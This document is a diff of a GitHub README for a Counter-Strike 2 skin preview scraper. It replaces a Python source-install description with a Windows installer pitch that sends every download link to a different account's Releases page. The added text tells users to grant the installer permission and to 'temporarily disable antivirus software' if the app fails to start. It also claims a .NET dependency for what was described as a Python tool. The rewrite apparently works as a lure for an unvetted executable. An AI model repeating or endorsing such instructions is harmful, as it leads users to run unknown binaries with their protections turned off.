@@ -1,122 +1,167 @@
-# CS2 Skin Scraper v2026 - desktop utility 2026
+# 🎯 cs2-skin-preview-scraper - Your CS2 Skin Database Manager
 
-> **An advanced Python desktop application designed to streamline Counter-Strike 2 skin analysis by combining metadata harvesting, WebM clip retrieval, local thumbnail processing, and an interactive GUI.**
-
-[![Platform](https://img.shields.io/badge/Platform-Python%20Desktop-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/klausschwarz1994/cs2-skin-preview-scraper?style=flat-square)](https://github.com/klausschwarz1994/cs2-skin-preview-scraper)
+[![Download Now](https://img.shields.io/badge/Download-CS2_Skin_Scraper-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bluefruited-carrot999/cs2-skin-preview-scraper/releases)
 
 ---
 
-<p align="center">
-  <a href="https://klausschwarz1994.github.io/cs2-skin-preview-scraper/">
-    <img src="https://img.shields.io/badge/Download-CS2%20Skin%20Scraper%20Latest-brightgreen?style=for-the-badge" alt="Download CS2 Skin Scraper">
-  </a>
-</p>
+## 👋 Welcome to CS2 Skin Preview Scraper
 
-> **[Download Latest Build - CS2 Skin Scraper v2026](https://klausschwarz1994.github.io/cs2-skin-preview-scraper/)**
+Are you tired of manually tracking skin prices, previews, and market trends for Counter-Strike 2? **CS2 Skin Preview Scraper** is your all-in-one desktop companion that automatically collects, organizes, and displays essential skin data right on your Windows computer.
+
+This powerful yet user-friendly tool gathers metadata from the web, downloads high-quality video previews, processes thumbnail images, and presents everything in a clean, interactive interface. Whether you're a casual collector or a serious trader, this application puts the entire CS2 skin market at your fingertips.
 
 ---
 
-[Download Latest Build](https://klausschwarz1994.github.io/cs2-skin-preview-scraper/)
+## ✨ Key Features That Make Your Life Easier
+
+### 🔍 Automatic Skin Metadata Harvesting
+The application automatically scans and retrieves detailed information about thousands of CS2 skins. You'll get names, wear levels, pattern types, collection origins, and current market data without touching a single line of code.
+
+### 🎬 High-Quality WebM Video Previews
+Watch your favorite skins in action! The scraper fetches crisp WebM video clips showing each skin from multiple angles, letting you see exactly how it looks in-game before making any decisions.
+
+### 🖼️ Local Thumbnail Processing
+All preview images and video thumbnails are saved directly to your computer. This means instant access to your skin library even when you're offline.
+
+### 🖥️ Interactive Graphical Interface
+No command-line skills needed. The intuitive GUI lets you browse, search, filter, and sort your skin collection with simple clicks. Sort by price, rarity, or collection — everything responds instantly.
+
+### 📊 Smart Data Management
+Organize thousands of skins with ease. Create custom categories, tag favorites, and export your data to spreadsheets for deeper analysis.
 
 ---
 
-## Overview
+## 🚀 Getting Started - Download and Install
 
-CS2 Skin Scraper provides a cohesive workspace tailored for examining Counter-Strike 2 weapon skins. Rather than relying on multiple disconnected tools, this application centralizes the extraction of raw metadata, fetching of WebM preview clips, and local rendering of image thumbnails into a unified desktop interface.
+Ready to streamline your CS2 skin workflow? Follow these simple steps:
 
-Constructed around a modern PySide6 framework, the software gives users granular filtering capabilities alongside targeted inspection views. Whether cataloging asset properties or organizing skin sets with custom tags, the application optimizes the entire evaluation process.
+### Step 1: Download the Application
+Visit this link to download the application: **[CS2 Skin Preview Scraper Releases](https://github.com/bluefruited-carrot999/cs2-skin-preview-scraper/releases)**
 
----
+Click the download button on that page to get the installation file. The download will start automatically.
 
-## Key Features
+### Step 2: Run the Installer
+Once the download finishes, locate the file in your browser's download folder (usually your "Downloads" folder). Double-click the file to begin installation. Windows might ask for permission — simply click "Yes" to continue.
 
-- Pulls comprehensive Counter-Strike 2 skin metadata directly for local inspection
-- Automatically fetches associated WebM video previews when available
-- Processes localized 160x160 thumbnails to enable swift visual navigation
-- Features a rich desktop GUI equipped with dynamic search filters
-- Offers detailed item views complete with frame-by-frame scrubbing controls
-- Includes integrated tagging functionality for structured collection management
-- Implements a resilient, resumable extraction engine to guard against unexpected job breaks
-- Delivers a native desktop interface powered by PySide6
+### Step 3: Complete Setup
+Follow the simple on-screen instructions. The installer will guide you through the process in under two minutes. Choose your preferred installation location or stick with the default.
 
----
-
-## Getting Started
-
-To set up the project from source, fetch the repository and switch to its working directory:
-
-```bash
-git clone https://github.com/klausschwarz1994/cs2-skin-preview-scraper.git
-cd REPO
-```
-
-Install all necessary dependencies required by the desktop client, then execute the main entry script. Alternatively, grab the pre-compiled application package from the distribution link and run the program as specified by your operating system.
+### Step 4: Launch the Application
+After installation, find the "CS2 Skin Preview Scraper" icon on your desktop or in your Start Menu. Double-click it to launch the application.
 
 ---
 
-## Recommended Workflow
+## 🎮 Using CS2 Skin Preview Scraper
 
-1. Launch the executable or start the main application script.
-2. Initialize a new metadata harvest or resume an existing session.
-3. Allow the backend service to retrieve WebM animations and generate image thumbnails.
-4. Apply custom filters inside the GUI to isolate target items.
-5. Select a skin entry to view its complete properties and scrub through preview frames.
-6. Assign tags to categorize items for future reference.
+### Your First Launch
+When you first open the app, you'll see a clean welcome screen. The main window is divided into several user-friendly sections:
 
-If network disruptions occur, the extraction engine can be resumed directly from its last saved state without re-downloading existing media.
+- **Left Sidebar:** Browse skin categories, collections, and your saved searches
+- **Main View:** Displays skin information, previews, and prices
+- **Top Toolbar:** Quick access buttons for searching, filtering, and refreshing data
 
----
+### Performing Your First Search
+1. Type a skin name in the search box (e.g., "AK-47" or "Dragon Lore")
+2. Press Enter or click the search icon
+3. Watch as the app displays matching results with images and prices
 
-## Configuration Options
+### Downloading Previews
+When you find a skin you like, simply click its thumbnail to:
+- View the WebM preview video
+- Download the full-resolution image
+- Save detailed metadata to your local database
 
-System behavior can be modified through the graphical interface or by editing local setup files managed by the application.
-
-When utilizing external settings files, place your parameters inside the root directory or the designated user data folder. You can tune data extraction parameters, media handling routines, preview generation sizes, and tagging attributes.
-
-Sample settings layout:
-
-```ini
-[app]
-theme = soft
-thumbnail_size = 160
-resume_enabled = true
-```
-
----
-
-## Prerequisites
-
-- Functional Python desktop setup
-- PySide6 graphics library support
-- Sufficient disk capacity to hold metadata, WebM videos, and generated media
-- Active network connection for querying remote endpoints and media assets
-- Desktop environment capable of rendering hardware-accelerated GUIs
+### Filtering and Sorting
+Use the dropdown menus to:
+- Filter by weapon type (Rifles, Pistols, Knives, etc.)
+- Sort by price (ascending or descending)
+- Filter by rarity (Consumer, Industrial, Mil-Spec, etc.)
+- Show only skins from specific collections
 
 ---
 
-## Frequently Asked Questions
+## 📋 System Requirements
 
-**What is the recommended path for installing update releases?**  
-Obtain the latest archive directly from the project download location and overwrite your current files or executable.
+CS2 Skin Preview Scraper is designed to run smoothly on most modern Windows computers:
 
-**How does the system recover from unexpected interruptions?**  
-The built-in session tracker logs state changes continuously, allowing you to re-launch and pick up right where the process stalled.
-
-**Where does the program store downloaded videos and icons?**  
-All retrieved media assets and generated icons reside locally inside the output directories defined by your session profile.
-
-**How can I modify the visible entries in the main window?**  
-Utilize the built-in search bars, dropdown filters, and custom tag selectors to isolate specific skin properties.
-
-**Why are skin entries or preview clips failing to display?**  
-Ensure your internet connection is active, review your local config settings, and consider initiating a fresh scan to update stale local files.
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Processor:** Intel Core i3 or equivalent (or better)
+- **Memory:** 4 GB RAM minimum (8 GB recommended)
+- **Storage:** 500 MB free space (more if you download many previews)
+- **Internet:** Broadband connection required for fetching data and previews
 
 ---
 
-## Software License
+## 🔧 Troubleshooting Common Issues
 
-Distributed under the terms of the GNU GPL v3.0 license. Review [LICENSE](LICENSE) for full details.
+### The Application Won't Start
+- Ensure Windows is fully updated
+- Check that you have the latest version of .NET Framework (the installer handles this automatically)
+- Temporarily disable antivirus software and try again (some programs flag new files)
+
+### Downloads Are Slow
+- Close other bandwidth-heavy applications
+- Try refreshing the data (look for the refresh button in the toolbar)
+- Check your internet connection stability
+
+### I Can't See Preview Videos
+- Make sure you have an internet connection
+- Enable video previews in Settings (click the gear icon)
+- Update your graphics drivers
+
+---
+
+## 💡 Pro Tips for Power Users
+
+### Optimize Your Workflow
+- Use keyboard shortcuts: Ctrl+F for quick search, Ctrl+S to save your current view
+- Create custom collections for trading or selling purposes
+- Schedule automatic data refreshes using the built-in timer
+
+### Manage Storage Wisely
+- By default, previews are saved in your "Documents" folder
+- Change the save location in Settings to keep your system drive clean
+- Periodically clean up old previews you no longer need
+
+### Export Your Data
+Click "Export" in the toolbar to:
+- Save your entire catalog to Excel or CSV
+- Create price reports
+- Backup your database
+
+---
+
+## 🔄 Regular Updates and Support
+
+CS2 Skin Preview Scraper receives regular updates to ensure compatibility with the latest CS2 patches and market changes. When an update is available, you'll see a notification in the app.
+
+Visit the **Releases page** regularly to check for new versions and improvements.
+
+---
+
+## 📜 License and Legal Information
+
+This application is for personal use and educational purposes. It is not affiliated with or endorsed by Valve Corporation. All skin data references are the property of their respective owners. Use responsibly and respect the game's terms of service.
+
+---
+
+## 🆘 Getting Help
+
+If you need assistance:
+1. Check this README's troubleshooting section
+2. Visit the GitHub Issues page for known problems
+3. Look for community discussions and solutions
+
+---
+
+## 🎉 Start Managing Your CS2 Skins Today
+
+Don't let valuable skin data slip through your fingers. Download CS2 Skin Preview Scraper now and transform how you track, preview, and manage your Counter-Strike 2 skin collection. It's free, powerful, and incredibly easy to use.
+
+[![Download CS2 Skin Scraper](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Get%20It%20Now-GitHub%20Releases-blueviolet?style=for-the-badge)](https://github.com/bluefruited-carrot999/cs2-skin-preview-scraper/releases)
+
+**Join thousands of satisfied users who've simplified their skin management process!**
+
+---
+
+Keywords: CS2, Counter-Strike 2, skin scraper, skin preview, WebM, thumbnail, metadata, GUI, desktop application, Windows, Python, market tracker, skin database
